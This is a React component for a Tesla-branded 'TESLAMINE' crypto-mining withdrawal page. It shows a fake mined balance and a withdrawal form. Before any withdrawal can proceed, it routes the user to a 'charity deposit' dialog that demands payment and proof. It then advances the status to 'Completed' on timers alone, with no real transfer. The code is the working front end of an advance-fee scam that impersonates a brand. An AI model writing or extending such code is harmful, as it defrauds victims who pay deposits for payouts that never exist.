          { label: "Network",            value: net?.label,             color: "#aaa" },
          { label: "Wallet Address",     value: shortAddr(data.wallet), color: "#aaa" },
          { label: "Est. Arrival",       value: net?.time || "1–3 hrs", color: "#aaa" },
        ].map(({ label, value, color, bold }) => (
          <div key={label} style={{ display: "flex", justifyContent: "space-between", padding: "11px 0", borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
            <span style={{ fontSize: 12, color: "#444" }}>{label}</span>
            <span style={{ fontSize: 13, color, fontWeight: bold ? 700 : 500 }}>{value}</span>
          </div>
        ))}
        <div style={{ display: "flex", gap: 10, marginTop: 22 }}>
          <button onClick={onCancel} style={{ flex: 1, padding: "13px 0", borderRadius: 11, background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)", color: "#555", fontSize: 13, fontFamily: "'JetBrains Mono',monospace", cursor: "pointer" }}>
            Cancel
          </button>
          <button onClick={onConfirm} style={{ flex: 2, padding: "13px 0", borderRadius: 11, background: "linear-gradient(135deg,#aa0000,#e31937)", color: "#fff", fontWeight: 700, fontSize: 13, fontFamily: "'JetBrains Mono',monospace", cursor: "pointer", boxShadow: "0 4px 18px rgba(227,25,55,0.35)" }}>
            ✓ Confirm & Submit
          </button>
        </div>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// MAIN WITHDRAWAL PAGE
// ─────────────────────────────────────────────────────────────────────────────
export default function WithdrawalPage({ onBack }) {
  const isMobile = useIsMobile();

  const [balance,         setBalance]         = useState(0);
  const [withdrawals,     setWithdrawals]     = useState([]);
  const [selectedNetwork, setSelectedNetwork] = useState("btc");
  const [wallet,          setWallet]          = useState("");
  const [amount,          setAmount]          = useState("");
  const [errors,          setErrors]          = useState({});
  const [showConfirm,     setShowConfirm]     = useState(false);
  const [activeTab,       setActiveTab]       = useState("withdraw");
  const [processing,      setProcessing]      = useState(null); // holds the withdrawal object while processing
  const [pendingWithdrawal, setPendingWithdrawal] = useState(null);
  const [showCharityDialog, setShowCharityDialog] = useState(false);

  const canWithdraw = balance >= MIN_WITHDRAWAL;

  // Load state
  useEffect(() => {
    setBalance(loadMined());
    setWithdrawals(loadWithdrawals());
  }, []);

  // Auto-progress status on existing pending withdrawals
  useEffect(() => {
    const iv = setInterval(() => {
      setWithdrawals((prev) => {
        let changed = false;
        const updated = prev.map((w) => {
          if (w.status === "Completed" || w.status === "Failed") return w;
          const elapsed = (Date.now() - w.timestamp) / 1000;
          let s = w.status;
          if (elapsed > 30  && s === "Submitted")  s = "Verifying";
          if (elapsed > 70  && s === "Verifying")  s = "Processing";
          if (elapsed > 120 && s === "Processing") s = "Completed";
          if (s !== w.status) { changed = true; return { ...w, status: s }; }
          return w;
        });
        if (changed) saveWithdrawals(updated);
        return changed ? updated : prev;
      });
    }, 6000);
    return () => clearInterval(iv);
  }, []);

  const net = NETWORKS.find(n => n.id === selectedNetwork);
  const parsedAmount = parseFloat(amount) || 0;
  const fee     = parsedAmount * WITHDRAWAL_FEE_PCT;
  const receive = parsedAmount - fee;

  const totalWithdrawn = withdrawals.filter(w => w.status === "Completed").reduce((s, w) => s + w.amount, 0);
  const pendingCount   = withdrawals.filter(w => w.status !== "Completed" && w.status !== "Failed").length;

  function validate() {
    const e = {};
    if (!amount || isNaN(parsedAmount) || parsedAmount <= 0) e.amount = "Enter a valid amount";
    else if (parsedAmount < MIN_WITHDRAWAL) e.amount = `Minimum withdrawal is $${MIN_WITHDRAWAL.toLocaleString()}`;
    else if (parsedAmount > balance) e.amount = `Exceeds your available balance of ${fmtBig(balance)}`;
    if (!wallet.trim() || wallet.trim().length < 10) e.wallet = "Enter a valid wallet address";
    setErrors(e);
    return Object.keys(e).length === 0;
  }

  function handleSubmit() {
    if (!canWithdraw) return;
    if (!validate()) return;
    // Build the pending withdrawal object to show in confirm modal
    setPendingWithdrawal({
      id: `WD-${Date.now()}`,
      timestamp: Date.now(),
      amount: parsedAmount,
      fee,
      receive,
      network: selectedNetwork,
      networkLabel: net?.label,
      coin: net?.symbol,
      wallet: wallet.trim(),
      status: "Submitted",
    });
    setShowConfirm(true);
  }

  function handleConfirm() {
    setShowConfirm(false);
    // Show charity deposit dialog — must be completed before withdrawal proceeds
    setShowCharityDialog(true);
  }

  function handleCharityProofSubmitted() {
    setShowCharityDialog(false);
    // Deduct from balance and show processing screen
    deductMined(pendingWithdrawal.amount);
    setBalance(b => Math.max(b - pendingWithdrawal.amount, 0));
    setProcessing(pendingWithdrawal);
  }

  function handleProcessingDone() {
    // Save as Pending (not Submitted) — 24h processing window
    const finalWithdrawal = { ...pendingWithdrawal, status: "Verifying", pendingUntil: Date.now() + 24 * 60 * 60 * 1000 };
    const updated = [finalWithdrawal, ...withdrawals];
    setWithdrawals(updated);
    saveWithdrawals(updated);
    // Reset form
    setAmount("");
    setWallet("");
    setErrors({});
    setPendingWithdrawal(null);
    setProcessing(null);
    // Switch to history tab
    setActiveTab("history");
  }

  const card = {
    background: "rgba(255,255,255,0.03)",
    border: "1px solid rgba(255,255,255,0.07)",
    borderRadius: 16,
    backdropFilter: "blur(12px)",
  };

  // ── PROCESSING SCREEN ──────────────────────────────────────────────────────
  if (processing) {
    return (
      <div style={{ minHeight: "100vh", background: "#06090f", fontFamily: "'JetBrains Mono', monospace", color: "#fff", display: "flex", flexDirection: "column" }}>
        <style>{`
          @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@700;800&display=swap');
          @keyframes pulse  { 0%,100%{opacity:1} 50%{opacity:.3} }
          @keyframes fadeIn { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }
          @keyframes float  { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
          @keyframes spinDash { 0%{stroke-dashoffset:326} 100%{stroke-dashoffset:0} }
          * { box-sizing:border-box; margin:0; padding:0; }
        `}</style>
        <div style={{ position: "fixed", inset: 0, backgroundImage: "linear-gradient(rgba(227,25,55,0.015) 1px,transparent 1px),linear-gradient(90deg,rgba(227,25,55,0.015) 1px,transparent 1px)", backgroundSize: "48px 48px", pointerEvents: "none" }} />
        <div style={{ position: "fixed", top: "50%", left: "50%", transform: "translate(-50%,-50%)", width: 600, height: 600, borderRadius: "50%", background: "radial-gradient(ellipse,rgba(227,25,55,0.05) 0%,transparent 70%)", pointerEvents: "none" }} />
        <header style={{ padding: "18px 24px", borderBottom: "1px solid rgba(255,255,255,0.05)", display: "flex", alignItems: "center", gap: 12, position: "relative", zIndex: 1 }}>
          <TeslaLogo size={28} color="#e31937" />
          <span style={{ fontFamily: "'Syne',sans-serif", fontWeight: 800, fontSize: 16 }}>TESLA<span style={{ color: "#e31937" }}>MINE</span></span>
        </header>
        <div style={{ position: "relative", zIndex: 1, flex: 1, display: "flex", flexDirection: "column" }}>
          <ProcessingScreen withdrawal={processing} onDone={handleProcessingDone} />
        </div>
      </div>
    );
  }

  // ── MAIN UI ────────────────────────────────────────────────────────────────
  return (
    <div style={{ minHeight: "100vh", background: "#06090f", fontFamily: "'JetBrains Mono', monospace", color: "#fff", position: "relative", overflow: "hidden" }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@700;800&display=swap');
        @keyframes pulse  { 0%,100%{opacity:1} 50%{opacity:.4} }
        @keyframes fadeIn { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }
        @keyframes float  { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
        @keyframes spinDash { to{stroke-dashoffset:-326} }
        * { box-sizing:border-box; margin:0; padding:0; }
        button { cursor:pointer; border:none; outline:none; }
        input::placeholder { color:#2a2a2a; }
        input:focus { outline:none; }
        ::-webkit-scrollbar { width:4px; }
        ::-webkit-scrollbar-thumb { background:#1e1e2e; border-radius:4px; }
      `}</style>

      {showConfirm && pendingWithdrawal && (
        <ConfirmModal
          data={pendingWithdrawal}
          onConfirm={handleConfirm}
          onCancel={() => { setShowConfirm(false); setPendingWithdrawal(null); }}
        />
      )}

      {showCharityDialog && pendingWithdrawal && (
        <CharityDialog
          network={pendingWithdrawal.network}
          onProofSubmitted={handleCharityProofSubmitted}
        />
      )}

      {/* BG */}
      <div style={{ position: "fixed", inset: 0, zIndex: 0, backgroundImage: "linear-gradient(rgba(227,25,55,0.015) 1px,transparent 1px),linear-gradient(90deg,rgba(227,25,55,0.015) 1px,transparent 1px)", backgroundSize: "48px 48px", pointerEvents: "none" }} />
      <div style={{ position: "fixed", top: -200, right: -200, width: 500, height: 500, borderRadius: "50%", background: "radial-gradient(circle,rgba(227,25,55,0.04) 0%,transparent 70%)", pointerEvents: "none" }} />

      <div style={{ position: "relative", zIndex: 1, maxWidth: 960, margin: "0 auto", padding: isMobile ? "0 16px 48px" : "0 28px 48px" }}>

        {/* HEADER */}
        <header style={{ padding: isMobile ? "18px 0 14px" : "24px 0 20px", borderBottom: "1px solid rgba(255,255,255,0.05)", marginBottom: 24, display: "flex", alignItems: "center", gap: 16, animation: "fadeIn 0.4s ease" }}>
          <button onClick={onBack} style={{ padding: "8px 14px", borderRadius: 10, background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)", color: "#666", fontSize: 13, fontFamily: "'JetBrains Mono',monospace", display: "flex", alignItems: "center", gap: 6 }}>
            ← Back
          </button>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <TeslaLogo size={28} color="#e31937" />
            <div>
              <div style={{ display: "flex", alignItems: "center", gap: 7, marginBottom: 1 }}>
                <div style={{ width: 6, height: 6, borderRadius: "50%", background: canWithdraw ? "#00c896" : "#e31937", animation: "pulse 2s ease-in-out infinite" }} />
                <span style={{ fontSize: 9, color: canWithdraw ? "#00c896" : "#e31937", letterSpacing: 3, textTransform: "uppercase" }}>
                  {canWithdraw ? "Withdrawal Unlocked" : "Withdrawal Locked"}
                </span>
              </div>
              <h1 style={{ fontSize: isMobile ? 18 : 22, fontFamily: "'Syne',sans-serif", fontWeight: 800, letterSpacing: -0.5 }}>
                WITHDRAW <span style={{ color: "#2a2a2a", fontSize: isMobile ? 13 : 16, fontWeight: 400 }}>/ Funds</span>
              </h1>
            </div>
          </div>
        </header>

        {/* BALANCE OVERVIEW CARDS */}
        <div style={{ display: "grid", gridTemplateColumns: isMobile ? "1fr 1fr" : "repeat(4,1fr)", gap: 10, marginBottom: 20, animation: "fadeIn 0.5s ease 0.1s both" }}>
          {[
            { label: "Available",  value: fmtBig(balance),        sub: canWithdraw ? "✓ Ready" : `$${fmtBig(MIN_WITHDRAWAL - balance)} more`, color: canWithdraw ? "#00c896" : "#e31937", accent: canWithdraw ? "rgba(0,200,150,0.07)" : "rgba(227,25,55,0.07)" },
            { label: "Withdrawn",  value: fmtBig(totalWithdrawn), sub: `${withdrawals.filter(w=>w.status==="Completed").length} done`, color: "#6366f1", accent: "rgba(99,102,241,0.07)" },
            { label: "Pending",    value: String(pendingCount),   sub: pendingCount > 0 ? "In progress" : "All clear", color: pendingCount > 0 ? "#f59e0b" : "#444", accent: "rgba(255,255,255,0.02)" },
            { label: "Min.",       value: `$${MIN_WITHDRAWAL.toLocaleString()}`, sub: canWithdraw ? "Met ✓" : "Keep mining", color: "#888", accent: "rgba(255,255,255,0.02)" },
          ].map(({ label, value, sub, color, accent }) => (
            <div key={label} style={{ ...card, padding: isMobile ? "10px 12px" : "12px 14px", background: accent }}>
              <div style={{ fontSize: 8, color: "#444", letterSpacing: 1, textTransform: "uppercase", marginBottom: 4 }}>{label}</div>
              <div style={{ fontSize: isMobile ? 14 : 20, fontWeight: 800, color, lineHeight: 1, marginBottom: 3, fontFamily: "'Syne',sans-serif", whiteSpace: "nowrap" }}>{value}</div>
              <div style={{ fontSize: 9, color: "#444", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>{sub}</div>
            </div>
          ))}
        </div>

        {/* TABS */}
        <div style={{ display: "flex", gap: 8, marginBottom: 22 }}>
          {["withdraw", "history"].map(t => (
            <button key={t} onClick={() => setActiveTab(t)} style={{ padding: "9px 20px", borderRadius: 10, fontSize: 12, fontWeight: 600, fontFamily: "'JetBrains Mono',monospace", transition: "all 0.2s", background: activeTab === t ? "rgba(227,25,55,0.12)" : "rgba(255,255,255,0.03)", border: `1px solid ${activeTab === t ? "rgba(227,25,55,0.3)" : "rgba(255,255,255,0.06)"}`, color: activeTab === t ? "#e31937" : "#444" }}>
              {t === "withdraw" ? "💸 Withdraw" : `📋 History (${withdrawals.length})`}
            </button>
          ))}
        </div>

        {/* ══ WITHDRAW TAB ══ */}
        {activeTab === "withdraw" && (
          <div style={{ animation: "fadeIn 0.4s ease" }}>
            {/* LOCKED state */}
            {!canWithdraw ? (
              <LockedScreen balance={balance} onBack={onBack} />
            ) : (
              /* UNLOCKED form */
              <div style={{ display: "grid", gridTemplateColumns: isMobile ? "1fr" : "1fr 320px", gap: 20 }}>

                {/* FORM */}
                <div style={{ ...card, padding: isMobile ? 20 : 28 }}>
                  <div style={{ fontSize: 10, color: "#444", letterSpacing: 2, textTransform: "uppercase", marginBottom: 20 }}>Withdrawal Details</div>

                  {/* Unlocked banner */}
                  <div style={{ background: "rgba(0,200,150,0.07)", border: "1px solid rgba(0,200,150,0.2)", borderRadius: 12, padding: "12px 16px", marginBottom: 22, display: "flex", gap: 10, alignItems: "center" }}>
                    <span style={{ fontSize: 18 }}>🎉</span>
                    <div>
                      <div style={{ fontSize: 12, color: "#00c896", fontWeight: 700, marginBottom: 2 }}>Withdrawal Unlocked!</div>
                      <div style={{ fontSize: 11, color: "#006644" }}>Your balance has reached the $1,000 threshold. You can now withdraw.</div>
                    </div>
                  </div>

                  {/* Network selector */}
                  <div style={{ marginBottom: 20 }}>
                    <label style={{ fontSize: 11, color: "#444", letterSpacing: 1.5, textTransform: "uppercase", display: "block", marginBottom: 10 }}>Select Network</label>
                    <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                      {NETWORKS.map(n => (
                        <button key={n.id} onClick={() => setSelectedNetwork(n.id)} style={{ padding: "11px 14px", borderRadius: 12, display: "flex", alignItems: "center", gap: 8, background: selectedNetwork === n.id ? `${n.color}18` : "rgba(255,255,255,0.03)", border: `1px solid ${selectedNetwork === n.id ? n.color + "55" : "rgba(255,255,255,0.06)"}`, transition: "all 0.2s", cursor: "pointer" }}>
                          <div style={{ width: 8, height: 8, borderRadius: "50%", background: n.color, boxShadow: selectedNetwork === n.id ? `0 0 8px ${n.color}` : "none", flexShrink: 0 }} />
                          <div style={{ textAlign: "left" }}>
                            <div style={{ fontSize: 12, fontWeight: 700, color: selectedNetwork === n.id ? "#fff" : "#555" }}>{n.symbol}</div>
                            <div style={{ fontSize: 9, color: "#333" }}>{n.time}</div>
                          </div>
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Wallet address */}
                  <div style={{ marginBottom: 18 }}>
                    <label style={{ fontSize: 11, color: "#444", letterSpacing: 1.5, textTransform: "uppercase", display: "block", marginBottom: 8 }}>Wallet Address</label>
                    <input
                      value={wallet}
                      onChange={e => { setWallet(e.target.value); setErrors(er => ({ ...er, wallet: "" })); }}
                      placeholder={`${net?.prefix || ""}...your wallet address`}
                      style={{ width: "100%", padding: "13px 16px", borderRadius: 12, background: "rgba(255,255,255,0.03)", border: `1px solid ${errors.wallet ? "#ff4455" : "rgba(255,255,255,0.08)"}`, color: "#fff", fontSize: 13, fontFamily: "'JetBrains Mono',monospace" }}
                    />
                    {errors.wallet && <div style={{ fontSize: 11, color: "#ff4455", marginTop: 5 }}>⚠ {errors.wallet}</div>}
                  </div>

                  {/* Amount */}
                  <div style={{ marginBottom: 20 }}>
                    <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
                      <label style={{ fontSize: 11, color: "#444", letterSpacing: 1.5, textTransform: "uppercase" }}>Amount (USD)</label>
                      <button onClick={() => setAmount(balance.toFixed(2))} style={{ fontSize: 10, color: "#e31937", background: "none", padding: "2px 8px", borderRadius: 6, border: "1px solid rgba(227,25,55,0.25)", cursor: "pointer" }}>MAX</button>
                    </div>
                    <div style={{ position: "relative" }}>
                      <span style={{ position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)", color: "#444", fontSize: 15 }}>$</span>
                      <input
                        type="number"
                        value={amount}
                        onChange={e => { setAmount(e.target.value); setErrors(er => ({ ...er, amount: "" })); }}
                        placeholder="0.00"
                        min={MIN_WITHDRAWAL}
                        max={balance}
                        style={{ width: "100%", padding: "13px 16px 13px 28px", borderRadius: 12, background: "rgba(255,255,255,0.03)", border: `1px solid ${errors.amount ? "#ff4455" : "rgba(255,255,255,0.08)"}`, color: "#fff", fontSize: 15, fontFamily: "'JetBrains Mono',monospace" }}
                      />
                    </div>
                    {errors.amount && <div style={{ fontSize: 11, color: "#ff4455", marginTop: 5 }}>⚠ {errors.amount}</div>}
                  </div>

                  {/* Fee breakdown */}
                  {parsedAmount > 0 && (
                    <div style={{ background: "rgba(255,255,255,0.02)", border: "1px solid rgba(255,255,255,0.05)", borderRadius: 12, padding: "14px 16px", marginBottom: 22 }}>
                      {[
                        { label: "Withdrawal Amount", value: fmtBig(parsedAmount),     color: "#ccc" },
                        { label: "Network Fee (1.5%)", value: `-${fmtBig(fee)}`,        color: "#ff6b6b" },
                        { label: "You Receive",        value: fmtBig(receive),          color: "#00c896", bold: true },
                      ].map(({ label, value, color, bold }) => (
                        <div key={label} style={{ display: "flex", justifyContent: "space-between", padding: "6px 0", borderBottom: label !== "You Receive" ? "1px solid rgba(255,255,255,0.04)" : "none" }}>
                          <span style={{ fontSize: 12, color: "#444" }}>{label}</span>
                          <span style={{ fontSize: 13, color, fontWeight: bold ? 700 : 500 }}>{value}</span>
                        </div>
                      ))}
                    </div>
                  )}

                  {/* SUBMIT BUTTON — only active when canWithdraw */}
                  <button
                    onClick={handleSubmit}
                    style={{
                      width: "100%", padding: "15px 0", borderRadius: 12,
                      background: "linear-gradient(135deg,#aa0000,#e31937)",
                      color: "#fff", fontWeight: 700, fontSize: 14,
                      fontFamily: "'JetBrains Mono',monospace", letterSpacing: 0.5,
                      boxShadow: "0 4px 20px rgba(227,25,55,0.35)",
                      cursor: "pointer", transition: "all 0.2s",
                    }}
                    onMouseEnter={e => e.currentTarget.style.transform = "translateY(-2px)"}
                    onMouseLeave={e => e.currentTarget.style.transform = "translateY(0)"}
                  >
                    → Request Withdrawal
                  </button>
                </div>

                {/* RIGHT INFO PANEL */}
                <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>

                  {/* Security notice */}
                  <div style={{ background: "rgba(99,102,241,0.07)", border: "1px solid rgba(99,102,241,0.18)", borderRadius: 14, padding: "16px 18px" }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 10 }}>
                      <span style={{ fontSize: 15 }}>🛡️</span>
                      <span style={{ fontSize: 10, color: "#6366f1", letterSpacing: 2, textTransform: "uppercase", fontWeight: 700 }}>Security Notice</span>
                    </div>
                    {["Processed within 1–3 hours", "Double-check your wallet address", "Transactions cannot be reversed", `Min withdrawal: $${MIN_WITHDRAWAL.toLocaleString()}`].map((t, i) => (
                      <div key={i} style={{ display: "flex", gap: 8, marginBottom: 6 }}>
                        <span style={{ color: "#6366f1", fontSize: 10, marginTop: 1, flexShrink: 0 }}>›</span>
                        <span style={{ fontSize: 11, color: "#555", lineHeight: 1.5 }}>{t}</span>
                      </div>
                    ))}
                  </div>

                  {/* Network info */}
                  <div style={{ ...card, padding: "16px 18px" }}>
                    <div style={{ fontSize: 10, color: "#444", letterSpacing: 2, textTransform: "uppercase", marginBottom: 14 }}>Network Info</div>
                    <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 14 }}>
                      <div style={{ width: 36, height: 36, borderRadius: "50%", background: `${net?.color}18`, border: `2px solid ${net?.color}44`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 13, fontWeight: 700, color: net?.color }}>
                        {net?.symbol?.slice(0, 1)}
                      </div>
                      <div>
                        <div style={{ fontSize: 15, fontWeight: 700, color: "#fff" }}>{net?.label}</div>
                        <div style={{ fontSize: 11, color: "#444" }}>{net?.symbol} Network</div>
                      </div>
                    </div>
                    {[
                      { label: "Est. Arrival",    value: net?.time },
                      { label: "Confirmations",   value: net?.confirmations },
                      { label: "Network Status",  value: "Operational", color: "#00c896" },
                    ].map(({ label, value, color }) => (
                      <div key={label} style={{ display: "flex", justifyContent: "space-between", padding: "7px 0", borderTop: "1px solid rgba(255,255,255,0.04)" }}>
                        <span style={{ fontSize: 11, color: "#444" }}>{label}</span>
                        <span style={{ fontSize: 12, color: color || "#ccc", fontWeight: 500 }}>{value}</span>
                      </div>
                    ))}
                  </div>

                  {/* Stats */}
                  <div style={{ ...card, padding: "16px 18px" }}>
                    <div style={{ fontSize: 10, color: "#444", letterSpacing: 2, textTransform: "uppercase", marginBottom: 12 }}>Your Stats</div>
                    {[
                      { label: "Total Requests",  value: withdrawals.length },
                      { label: "Completed",        value: withdrawals.filter(w => w.status === "Completed").length },
                      { label: "Pending",          value: pendingCount },
                      { label: "Total Withdrawn",  value: fmtBig(totalWithdrawn) },
                    ].map(({ label, value }) => (
                      <div key={label} style={{ display: "flex", justifyContent: "space-between", padding: "7px 0", borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                        <span style={{ fontSize: 11, color: "#444" }}>{label}</span>
                        <span style={{ fontSize: 13, color: "#ccc", fontWeight: 600 }}>{value}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {/* ══ HISTORY TAB ══ */}
        {activeTab === "history" && (
          <div style={{ animation: "fadeIn 0.4s ease" }}>
            {withdrawals.length === 0 ? (
              <div style={{ ...card, padding: 52, textAlign: "center" }}>
                <div style={{ fontSize: 44, marginBottom: 14 }}>📭</div>
                <div style={{ fontSize: 16, color: "#444", marginBottom: 6 }}>No withdrawals yet</div>
                <div style={{ fontSize: 12, color: "#2a2a2a" }}>Your withdrawal history will appear here once you make your first request.</div>
              </div>
            ) : (
              <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
                {withdrawals.map((w) => {
                  const wNet = NETWORKS.find(n => n.id === w.network);
                  return (
                    <div key={w.id} style={{ ...card, padding: isMobile ? 18 : "22px 26px", position: "relative", overflow: "hidden" }}>
                      <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 2, background: w.status === "Completed" ? "linear-gradient(90deg,transparent,#00c896,transparent)" : w.status === "Failed" ? "linear-gradient(90deg,transparent,#ff4455,transparent)" : "linear-gradient(90deg,transparent,#e31937,transparent)", opacity: 0.5 }} />

                      {/* Top row */}
                      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 18, flexWrap: "wrap", gap: 10 }}>
                        <div>
                          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 5 }}>
                            <span style={{ fontSize: 15, fontWeight: 800, color: "#fff", fontFamily: "'Syne',sans-serif" }}>{fmtBig(w.amount)}</span>
                            <span style={{ fontSize: 11, color: "#333" }}>→</span>
                            <span style={{ fontSize: 15, fontWeight: 800, color: "#00c896", fontFamily: "'Syne',sans-serif" }}>{fmtBig(w.receive)}</span>
                            <span style={{ fontSize: 10, color: "#333" }}>received</span>
                          </div>
                          <div style={{ fontSize: 11, color: "#444" }}>
                            {tsToDate(w.timestamp)} · {tsToTime(w.timestamp)} · {w.networkLabel} · {shortAddr(w.wallet)}
                          </div>
                        </div>
                        <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 6 }}>
                          <StatusBadge status={w.status} />
                          <span style={{ fontSize: 10, color: "#2a2a2a" }}>{w.id}</span>
                        </div>
                      </div>

                      {/* Status tracker */}
                      {w.status !== "Failed" && <StatusTracker status={w.status} />}

                      {/* 24h Pending notice */}
                      {w.pendingUntil && w.status !== "Completed" && w.status !== "Failed" && (
                        <div style={{ background: "rgba(245,158,11,0.07)", border: "1px solid rgba(245,158,11,0.2)", borderRadius: 10, padding: "10px 14px", marginTop: 10, display: "flex", gap: 10, alignItems: "center" }}>
                          <span style={{ fontSize: 14 }}>⏳</span>
                          <div>
                            <div style={{ fontSize: 11, color: "#f59e0b", fontWeight: 700, marginBottom: 2 }}>Withdrawal Pending</div>
                            <div style={{ fontSize: 11, color: "#6b5010", lineHeight: 1.5 }}>
                              Your payment proof is being verified. Payment will be made to your wallet within <strong style={{ color: "#f59e0b" }}>24 hours</strong>. Please do not submit another request.
                            </div>
                          </div>
                        </div>
                      )}

                      {/* Details row */}
                      <div style={{ display: "flex", gap: isMobile ? 14 : 28, flexWrap: "wrap", marginTop: 10, paddingTop: 12, borderTop: "1px solid rgba(255,255,255,0.04)" }}>
                        {[
                          { label: "Gross Amount", value: fmtBig(w.amount),   color: "#ccc" },
                          { label: "Fee Paid",      value: fmtBig(w.fee),      color: "#ff6b6b" },
                          { label: "Net Received",  value: fmtBig(w.receive),  color: "#00c896" },
                          { label: "Network",       value: w.coin,             color: wNet?.color || "#ccc" },
                        ].map(({ label, value, color }) => (
                          <div key={label}>
                            <div style={{ fontSize: 9, color: "#333", textTransform: "uppercase", letterSpacing: 1, marginBottom: 3 }}>{label}</div>
                            <div style={{ fontSize: 13, fontWeight: 700, color }}>{value}</div>
                          </div>
                        ))}
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
